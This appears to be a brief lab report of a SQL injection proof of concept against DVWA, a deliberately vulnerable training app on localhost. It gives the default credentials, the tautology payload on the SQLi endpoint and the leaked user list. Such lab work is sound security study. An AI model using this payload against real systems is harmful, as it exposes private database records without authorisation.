# DVWA SQL Injection PoC

Date: `2026-06-28`

## Target

- `http://localhost:8080`

## Setup

DVWA was reset through `setup.php` to restore the documented default credentials:

- username: `admin`
- password: `password`

## Correction

The database was reset through `setup.php` before the final verification run. The login-based PoC now reproduces cleanly from the documented default credentials.

## Execution

The SQL injection proof-of-concept used the low-security DVWA SQLi endpoint:

```text
/vulnerabilities/sqli/?id=1' or '1'='1&Submit=Submit
```

## Result

The response returned multiple records instead of a single user lookup, including:

- `admin admin`
- `Gordon Brown`
- `Hack Me`
- `Pablo Picasso`
- `Bob Smith`

## Impact

The input reaches the database query unsafely and exposes data through classic SQL injection in the lab environment.
